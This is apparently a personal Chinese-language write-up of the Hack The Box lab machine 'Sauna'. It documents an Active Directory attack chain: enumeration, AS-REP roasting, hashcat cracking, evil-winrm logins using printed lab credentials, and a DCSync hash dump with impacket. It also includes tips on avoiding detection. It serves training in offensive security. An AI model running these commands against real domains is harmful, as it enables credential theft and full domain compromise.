## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Sauna
2. 難度:Easy
3. IP:10.129.95.180

### 主要發現：
1. 漏洞 ：（風險等級：）
2. 漏洞 ：（風險等級：）

### 攻擊鏈摘要：

### 潛在影響：

### 修復建議：

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠，除了AD環境以外還有http服務，http優先度肯定是非常高的
```bash
sudo nmap -sT -Pn --min-rate 1000 -p- 10.129.95.180 -oA portscan/ports
sudo nmap -sU --top-ports 20 10.129.95.180 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p$ports 10.129.95.180 -oA portscan/detail
sudo nmap --script=vuln -p$ports 10.129.95.180 -oA portscan/vuln
```

<img width="693" height="610" alt="螢幕擷取畫面 2026-04-07 210638" src="https://github.com/user-attachments/assets/a61bb13d-014e-4567-ad92-e17cd41a45a5" />

<img width="598" height="570" alt="螢幕擷取畫面 2026-04-07 210647" src="https://github.com/user-attachments/assets/491404ce-a5cc-408c-b757-71724c3eba57" />

<img width="1139" height="789" alt="螢幕擷取畫面 2026-04-07 211127" src="https://github.com/user-attachments/assets/db976e2f-ba11-47c1-8210-d350ce5244df" />

<img width="1413" height="814" alt="螢幕擷取畫面 2026-04-07 211635" src="https://github.com/user-attachments/assets/085571a4-ad98-4e9e-a127-a46e9efa53d1" />

整理多開放埠的小技巧，已在多篇報告中提及
```bash
ports=(grep open portscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',' )
```

<img width="1015" height="212" alt="螢幕擷取畫面 2026-04-07 210826" src="https://github.com/user-attachments/assets/ffc3ae40-ec03-4a1d-b7ea-27a164055715" />

將掃描到的域名寫入/etc/hosts

<img width="484" height="246" alt="螢幕擷取畫面 2026-04-07 211805" src="https://github.com/user-attachments/assets/cf1188fe-9f69-45ae-a12f-027b7d5fae03" />

時間同步一定要養成習慣，尤其是開始Kerberoas相關攻擊之前，UDP123有開放，使用ntpdate

```bash
sudo ntpdate 10.129.95.180
```

<img width="814" height="123" alt="螢幕擷取畫面 2026-04-07 212907" src="https://github.com/user-attachments/assets/2f163978-c4d3-40dd-91db-a02cd76cf63c" />



### 2.2 枚舉(Enumeration)

http/80是一靜態網頁，我用Gobuster檢查了子目錄，也用ffuf檢查了子網域，但並未有所收穫
```bash
sudo gobuster dir -u http://egotistical-bank.local -w /usr/share/wordlists/dirb/common.txt -t 40
```

<img width="942" height="483" alt="螢幕擷取畫面 2026-04-07 212108" src="https://github.com/user-attachments/assets/5f2b04f7-c5e4-48c9-8474-528b23c7ebd1" />

SMB匿名枚舉，使用smbclient模仿正常流量

```bash
smbclient -L //10.129.95.180 -N
```

<img width="819" height="194" alt="螢幕擷取畫面 2026-04-07 212325" src="https://github.com/user-attachments/assets/c5ab2a95-b80d-4896-bb9c-81cf6fd7d56c" />

RPC匿名枚舉，使用rpcclient模仿正常流量

```bash
rpcclient 10.129.95.180 -U "" -N
```

<img width="643" height="284" alt="螢幕擷取畫面 2026-04-07 212547" src="https://github.com/user-attachments/assets/8dd0f430-723d-4820-b71d-f95f40545b7b" />

rpcclient在枚舉時通常要求的權限是比較高的，如果可以訪問卻得不出甚麼東西，一定不能忽略使用impacket-lookupsid，這個工具要求權限比較低，但流量特徵明顯，所以不會優先選擇

```bash
impacket-lookupsid ""@10.29.95.180 -no-pass
```

<img width="1555" height="153" alt="螢幕擷取畫面 2026-04-07 212833" src="https://github.com/user-attachments/assets/cee8a948-a588-4af9-af9b-d2c78a5de6d4" />

使用ldapsearch枚舉LDAP服務，這個工具流量特徵非常明顯，因為TCP389 686的連線本身就是一個明顯的指標，實戰中通常會做混淆

```bash
ldapsearch -x -H ldap://10.129.95.180 -s base namingcontext
ldapsearch -x -H ldap://10.129.95.180 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

<img width="653" height="469" alt="螢幕擷取畫面 2026-04-07 213414" src="https://github.com/user-attachments/assets/23e6c393-5601-494f-b252-fa3205a41584" />

<img width="736" height="656" alt="螢幕擷取畫面 2026-04-07 213519" src="https://github.com/user-attachments/assets/7875bc82-c14d-4976-94ab-7a15986e5f07" />

在其中我發現一個使用者帳號，他來自於http頁面上的員工介紹，是兩個人的名字的結合，這些名字很可疑

<img width="743" height="379" alt="螢幕擷取畫面 2026-04-07 213659" src="https://github.com/user-attachments/assets/939ff087-3724-4f22-abd7-022612abcbe3" />

<img width="1228" height="770" alt="螢幕擷取畫面 2026-04-07 213744" src="https://github.com/user-attachments/assets/257e0225-59cb-43ba-95c3-0b8fe76c0fad" />

### 2.3 初始存取(Initial Access)

我把這些名字抓下來做成文件

<img width="291" height="393" alt="螢幕擷取畫面 2026-04-07 214906" src="https://github.com/user-attachments/assets/ece660c8-0823-4991-b549-29c78d23d541" />

開始攻擊前記得做時間同步，這裡不展示了

直接拿這些名字嘗試AS-REP Roasting烤票，使用impacket-GetNPUsers工具，這是專門執行AS-REP Roasting的工具

AS-REP Roasting：當使用者帳號被設置「不需要Kerberos預身分驗證(Do not require Kerberos Pre-Authentication)」時，攻擊者可偽造請求，DC不會驗證身分，直接返回AS-REP數據包，數據包裡含使用者的密碼哈希，可被離線破解

```bash
impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/' -userfile username_http -format hashcat -outputfile hashes.aspreroast -dc-ip 10.129.95.180 
```

<img width="1293" height="438" alt="螢幕擷取畫面 2026-04-07 220915" src="https://github.com/user-attachments/assets/3444b64c-a1d5-4aac-a3fc-ffd28b2fcfbe" />

烤票沒有出結果，我打算使用username-anarchy這款工具增加複雜度，在暴力破解的時候，童常會先以小字典開始，用規則增加小字典的複雜度，如果還是沒破解，再使用大字典，並配合規則

<img width="1028" height="734" alt="螢幕擷取畫面 2026-04-07 221437" src="https://github.com/user-attachments/assets/ccae89f0-e38b-4685-ae53-3e478bf98c4a" />

再次烤票，得出一組憑證

<img width="1319" height="695" alt="螢幕擷取畫面 2026-04-07 221512" src="https://github.com/user-attachments/assets/4e602b0e-082e-4ea5-aee9-ac6aaecf6d01" />

使用hashcat離線破解哈希，若是不清楚哈希類別，可以用-hh參數配合grep尋找

```bash
hashcat -m 18200 -a 0 hashes.aspreroast /usr/share/wordlists/rockyou.txt
```

<img width="867" height="269" alt="螢幕擷取畫面 2026-04-07 221557" src="https://github.com/user-attachments/assets/79ea5927-6c36-4fc9-8f2c-d699f3dc3cfd" />

<img width="786" height="322" alt="螢幕擷取畫面 2026-04-07 221719" src="https://github.com/user-attachments/assets/d7a4d86a-6a14-4064-8571-c582e1d92605" />

<img width="1786" height="473" alt="螢幕擷取畫面 2026-04-07 221728" src="https://github.com/user-attachments/assets/b82eae3c-8fcb-4930-a8f6-61eb7b7ced33" />

將獲得的憑證存成文件

<img width="275" height="149" alt="螢幕擷取畫面 2026-04-07 221821" src="https://github.com/user-attachments/assets/fe8f2c3a-e7d2-44ec-9b31-e915be3d3eef" />

使用evil-winrm嘗試登入，這是隱蔽性和完整性相對較好的工具，需要TCP5985/5986要有開，如果獲得憑證應優先嘗試

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```

<img width="1207" height="287" alt="螢幕擷取畫面 2026-04-07 221930" src="https://github.com/user-attachments/assets/34745fca-1b47-469a-a9d1-e0404c210135" />

獲得user.txt

<img width="566" height="284" alt="螢幕擷取畫面 2026-04-07 222016" src="https://github.com/user-attachments/assets/def4dd61-d87c-49c7-9d7c-a07058082b3e" />


### 2.4 橫向移動(Lateral Movement)

嘗試手工枚舉，首先要了解一下自己，以及網域的架構，有些命令沒有截圖到，就省略掉了

```powershell
net user /domain
net group /domain
net user fsmith
whoami /groups
whoami /priv
Get-ADUser -Idenfity fsmith -Properties *
```

<img width="682" height="168" alt="螢幕擷取畫面 2026-04-07 222207" src="https://github.com/user-attachments/assets/4284e395-d0dc-48d1-91f5-51cff6ad5b9b" />

<img width="644" height="416" alt="螢幕擷取畫面 2026-04-07 222243" src="https://github.com/user-attachments/assets/b4d465bf-558d-41a7-a29c-f38a218b7e57" />

<img width="567" height="508" alt="螢幕擷取畫面 2026-04-07 222943" src="https://github.com/user-attachments/assets/8cca9757-8883-4fc3-bd1b-61c7b8af10d9" />

<img width="1150" height="310" alt="螢幕擷取畫面 2026-04-07 223558" src="https://github.com/user-attachments/assets/24bfe3cd-3a5f-4f96-8f79-d0954c240de4" />

我檢查了C碟，看是否有可利用的安裝檔

<img width="839" height="743" alt="螢幕擷取畫面 2026-04-07 224214" src="https://github.com/user-attachments/assets/a274ee21-ace7-43bb-8493-0714e6c82f87" />

枚舉了任務以及可能有敏感字詞的檔案

<img width="1884" height="169" alt="螢幕擷取畫面 2026-04-07 224412" src="https://github.com/user-attachments/assets/ad1df6c5-8332-4961-83dc-63b0025881f4" />

我檢查了家目錄，發現有一個使用者svc_loanmgr，看起來像是服務帳號，可能是我橫向移動的目標

<img width="658" height="256" alt="螢幕擷取畫面 2026-04-07 224501" src="https://github.com/user-attachments/assets/f8f435ee-4ea4-48cc-b984-1318dfbebef8" />

這個帳號沒有開啟SPN，無法進行Kerberoasting攻擊

<img width="1197" height="133" alt="螢幕擷取畫面 2026-04-07 224819" src="https://github.com/user-attachments/assets/6c6bff92-8f1e-4b1d-9273-56e594cbc3db" />

我檢查了註冊表，找到了一組明文憑證，這個使用者名稱看起來跟剛才設定的目標相似，應該是經過改名

<img width="890" height="775" alt="螢幕擷取畫面 2026-04-07 225255" src="https://github.com/user-attachments/assets/4fcf4aef-0a0d-4ef0-bf8c-cb485867f620" />

存成文件

<img width="388" height="158" alt="螢幕擷取畫面 2026-04-07 225400" src="https://github.com/user-attachments/assets/c1df76f6-3a62-4d86-8563-235c96fb7fba" />

使用evil-winrm橫向移動成功，這裡我因為斷線重製了靶機，導致IP地址有變動

<img width="1212" height="254" alt="螢幕擷取畫面 2026-04-07 230917" src="https://github.com/user-attachments/assets/328fa0e5-f3a4-4a60-af41-460e03d3d3e7" />



### 2.5 權限提升(Privilege Escalation)

我一樣使用手動枚舉，第一步跟橫向移動時類似，都是先認識自己

<img width="632" height="194" alt="螢幕擷取畫面 2026-04-07 231810" src="https://github.com/user-attachments/assets/949c3613-fec9-4c9a-bf18-81318efb405b" />

<img width="1146" height="307" alt="螢幕擷取畫面 2026-04-07 231831" src="https://github.com/user-attachments/assets/37fed8ff-3573-4e31-9543-b20778a6998e" />

<img width="886" height="717" alt="螢幕擷取畫面 2026-04-07 231938" src="https://github.com/user-attachments/assets/2d2af746-0a05-457b-9929-d4b5a24640ba" />

我先檢查了網域的ACL，並以目前帳號作為篩選，這會篩選出"我能對網域做什麼"

<img width="772" height="37" alt="螢幕擷取畫面 2026-04-07 232750" src="https://github.com/user-attachments/assets/0ecdb646-041d-4124-9850-6c5265d536d7" />


<img width="1759" height="679" alt="螢幕擷取畫面 2026-04-07 232411" src="https://github.com/user-attachments/assets/436055e5-6367-4bfc-9fc0-f449da3c860e" />

可以去Windows官方查找這兩條權限，這兩個權限都是執行DCSync攻擊必備的權限，也就是說，我不必多作調整就能直接發動DCSync攻擊

<img width="958" height="507" alt="螢幕擷取畫面 2026-04-07 232706" src="https://github.com/user-attachments/assets/b578b41d-7b72-48ac-8906-d12d849cff49" />

<img width="916" height="524" alt="螢幕擷取畫面 2026-04-07 232714" src="https://github.com/user-attachments/assets/e5c7e4bc-d92b-40f8-bdc4-98a4a12bcfab" />

DCSync攻擊，攻擊者如果擁有特定權限(DS-Replication-Get-Changes和DS-Replication-Get-Changes-All)，可以偽裝成一台DC，向真實的DC發送一個GetNCChanges請求(目錄複製服務遠端協定MS-DRSR)。DC會誤以為這是合法的同步請求，直接將包含使用者NTLM Hash的資料發送給攻擊者

攻擊發起前要做時間同步，這裡不另外展示

使用impacket-secretdump擷取哈希，注意這個工具會產生大量的SMB流量

```bash
impacket-secretdump 'svc_loanmgr:Moneymakestheworldgoround!@10.129.238.93'
```

<img width="1111" height="655" alt="螢幕擷取畫面 2026-04-07 233939" src="https://github.com/user-attachments/assets/87879c30-2337-4e08-a95c-ad8cb4223f07" />

使用獲得的哈希登入

<img width="1188" height="272" alt="螢幕擷取畫面 2026-04-07 234156" src="https://github.com/user-attachments/assets/f146884e-1711-4f71-a74c-98fb4265cdc5" />



### 2.6 最終成果(Impact)

獲得root.txt


<img width="642" height="398" alt="螢幕擷取畫面 2026-04-07 234348" src="https://github.com/user-attachments/assets/1470bcc5-c111-4a21-996e-a75afc96d730" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 初次獲得使用者名稱有點類似社交工程，從網站爬下來再用規則，我覺得挺不錯的
2. 嘗試用AD模組，並非PowerView來手動枚舉，效果挺不錯


### 浪費時間的部分：

1. 查詢註冊表並不會花太多精力，通常就一行指令的事，應該將優先度提前

### 新知識點：

1. 攻擊鏈清晰簡單，只是找使用者名稱那裡要注意網頁，因為一開始可能會把HTTP當作兔子洞

### 與實戰對應：

1. 暴力破解時，先以有關連的小字典為起點，以規則擴充字典，若不行再出動大字典，大字典也篩不到可以再加規則

